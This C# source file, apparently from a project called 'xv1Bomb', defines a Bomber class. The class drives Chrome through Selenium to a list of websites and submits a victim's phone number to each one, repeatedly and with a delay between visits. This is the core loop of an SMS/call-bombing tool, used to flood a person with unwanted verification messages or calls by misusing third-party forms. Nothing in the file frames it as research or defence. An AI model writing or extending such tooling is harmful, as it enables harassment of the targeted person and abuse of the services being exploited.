using System.Collections.Generic;
using System;
using OpenQA.Selenium;
using System.Threading;
using System.Threading.Tasks;
using OpenQA.Selenium.Chrome;

namespace xv1Bomb
{
    public class Bomber : IObserveable {
        private List<IObserver> Websites { get; set; }
        private IWebDriver WebDriver { get; set; }

        public Bomber() {
            this.Websites = new List<IObserver>();
            WebDriver = new ChromeDriver();
        }

        public void AddObserver(IObserver o) {
            Websites.Add(o);
        }
        
        public void RemoveObserver(IObserver o) {
            Websites.Remove(o);
        }

        public async Task Start(string phoneNumber,CancellationToken ct ,int repeat,int delay) {
            for (int i = 0;i<repeat;i++) {
                foreach (var site in Websites) {
                    if (!ct.IsCancellationRequested) {
                        Console.ForegroundColor = ConsoleColor.DarkMagenta;
                        Console.WriteLine(site.Link);
                        Console.ForegroundColor = ConsoleColor.White;
                        WebDriver.Navigate().GoToUrl(site.Link);
                        site.Handle(WebDriver,phoneNumber);
                        Thread.Sleep(delay);
                    } else break;
                }
            }
        }
    }
}